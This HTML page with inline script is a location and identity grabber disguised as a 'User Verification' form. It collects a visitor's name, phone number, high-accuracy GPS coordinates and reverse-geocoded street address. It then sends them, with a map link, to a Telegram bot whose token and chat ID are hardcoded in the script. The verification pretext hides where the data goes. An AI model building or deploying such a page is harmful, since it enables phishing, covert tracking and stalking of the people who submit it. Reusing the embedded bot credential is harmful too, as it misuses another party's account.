<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>User Info Capture</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{
  font-family:Arial, sans-serif;
  background:#eef2f7;
  padding:20px;
}
.box{
  max-width:430px;
  margin:auto;
  background:#fff;
  padding:20px;
  border-radius:12px;
  box-shadow:0 4px 12px rgba(0,0,0,.1);
}
h2{text-align:center}
input,button{
  width:100%;
  padding:12px;
  margin:8px 0;
  border-radius:8px;
  border:1px solid #ccc;
  font-size:15px;
}
button{
  background:#0088cc;
  color:#fff;
  border:none;
  cursor:pointer;
}
#status{
  font-size:14px;
  text-align:center;
  margin-top:6px;
}
</style>
</head>

<body>
<div class="box">
<h2>User Verification</h2>

<input id="name" placeholder="Full Name">
<input id="phone" placeholder="Phone Number">

<button onclick="getGPS()">üìç Capture Location</button>
<div id="status">Location not captured</div>

<button onclick="submitData()">Submit</button>
</div>

<script>
const statusEl = document.getElementById("status");
let gpsLat=null, gpsLng=null, accuracy=null;
let fullAddress="Not Available";

/* Reverse geocoding */
async function reverseGeocode(lat,lng){
  try{
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      {
        headers:{
          "User-Agent":"LocationCaptureDemo/1.0"
        }
      }
    );
    const data = await res.json();
    fullAddress = data.display_name || "Address not found";
  }catch(e){
    fullAddress = "Address fetch failed";
  }
}

/* Capture GPS */
function getGPS(){
  if(!navigator.geolocation){
    statusEl.innerHTML = "Geolocation not supported ‚ùå";
    return;
  }

  statusEl.innerHTML = "Capturing location‚Ä¶";

  navigator.geolocation.getCurrentPosition(
    async pos=>{
      gpsLat = pos.coords.latitude;
      gpsLng = pos.coords.longitude;
      accuracy = Math.round(pos.coords.accuracy);

      await reverseGeocode(gpsLat, gpsLng);

      statusEl.innerHTML =
        "üìç Location captured ‚úîÔ∏è<br>Accuracy: "+accuracy+" m";
    },
    err=>{
      statusEl.innerHTML = "Location permission denied ‚ùå";
    },
    {
      enableHighAccuracy:true,
      timeout:15000,
      maximumAge:0
    }
  );
}

/* Submit */
function submitData(){

  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();

  if(!name || !phone){
    alert("Name & Phone required");
    return;
  }

  if(gpsLat === null){
    alert("Please capture location first");
    return;
  }

  // üî¥ PASTE YOUR TOKEN
  const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
  const CHAT_ID = "543961277";

  const mapLink = `https://www.google.com/maps?q=${gpsLat},${gpsLng}`;
  const time = new Date().toLocaleString("en-IN");

  const message =
`üì© NEW USER SUBMISSION

üë§ Name: ${name}
üìû Phone: ${phone}

üìç Location:
Lat: ${gpsLat}
Lng: ${gpsLng}
Accuracy: ${accuracy} m

üè† Address:
${fullAddress}

üó∫ Map:
${mapLink}

‚è∞ Time:
${time}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:CHAT_ID,
      text:message
    })
  })
  .then(()=>{
    alert("Data sent ‚úÖ");
  })
  .catch(()=>{
    alert("send failed ‚ùå");
  });
}
</script>
</body>
</html>
